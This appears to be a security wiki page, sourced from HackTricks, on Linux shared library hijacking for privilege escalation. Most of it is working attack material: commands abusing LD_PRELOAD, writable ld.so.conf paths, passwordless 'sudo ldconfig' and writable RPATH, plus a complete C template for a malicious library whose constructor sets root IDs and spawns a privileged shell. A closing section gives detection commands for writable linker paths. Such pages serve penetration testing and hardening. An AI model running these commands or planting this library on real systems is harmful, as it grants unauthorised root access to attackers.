---
title: "Shared Library Hijacking"
tags: [privilege-escalation, linux-hardening, ld-so, library-injection]
sources: [hacktricks-ld-so-conf-example.md, hacktricks-write-to-root.md]
updated: 2026-05-01
---

# Shared Library Hijacking

## Summary

Shared library hijacking exploits the Linux dynamic linker's library search order to load a malicious `.so` file instead of the intended one. When a SUID binary or a root-owned process loads a library whose search path includes an attacker-writable directory, the attacker can substitute a malicious library to execute code as root.

## Attack Vectors

### 1. LD_PRELOAD (unprivileged, non-SUID only)

```bash
# Only works for non-SUID binaries — linker ignores LD_PRELOAD for SUID
LD_PRELOAD=/tmp/evil.so /usr/bin/some-binary
```

Most significant when combined with `sudo` rules that don't clean the environment (`env_keep += LD_PRELOAD`).

### 2. /etc/ld.so.conf.d misconfiguration

If any path listed in `/etc/ld.so.conf` or `/etc/ld.so.conf.d/*.conf` is writable:

```bash
# Check all listed paths
ldconfig -v 2>/dev/null | grep "^/"
cat /etc/ld.so.conf /etc/ld.so.conf.d/* 2>/dev/null

# Drop malicious library in writable path
gcc -shared -o /writable/path/libtarget.so -fPIC evil.c
# Wait for root to run ldconfig (reboot, cron, SUID ldconfig)
```

### 3. sudo ldconfig

If `sudo ldconfig` is allowed without password:

```bash
echo "include /tmp/conf/*" > /tmp/fake.ld.so.conf
mkdir -p /tmp/conf && echo "/tmp" > /tmp/conf/evil.conf
sudo ldconfig -f /tmp/fake.ld.so.conf
# /tmp/libtarget.so now in linker cache
```

### 4. RPATH / RUNPATH in binary

```bash
# Check if binary has a writable RPATH
readelf -d /path/to/suid-binary | grep -E 'RPATH|RUNPATH'
objdump -x /path/to/suid-binary | grep 'RPATH\|RUNPATH'
```

If RPATH points to a writable directory, drop the library there — takes priority over system paths.

## Malicious Library Template

```c
// gcc -shared -o libtarget.so -fPIC evil.c
#include <unistd.h>
#include <sys/types.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

Using `__attribute__((constructor))` ensures execution on library load, regardless of which function is called.

## Detection

```bash
# Find writable conf paths
find /etc/ld.so.conf /etc/ld.so.conf.d -writable 2>/dev/null
ldconfig -v 2>/dev/null | grep "^/" | while read d; do
    [ -w "$d" ] && echo "WRITABLE: $d"
done

# Check SUID binaries for suspicious RPATH
find / -perm -4000 2>/dev/null -exec readelf -d {} + 2>/dev/null | grep RPATH
```

## Sources

- [HackTricks: ld.so Privilege Escalation Example](../sources/hacktricks-ld-so-conf-example.md)
- [HackTricks: Write to Root](../sources/hacktricks-write-to-root.md)

## Related

- [linux-privilege-escalation](linux-privilege-escalation.md)
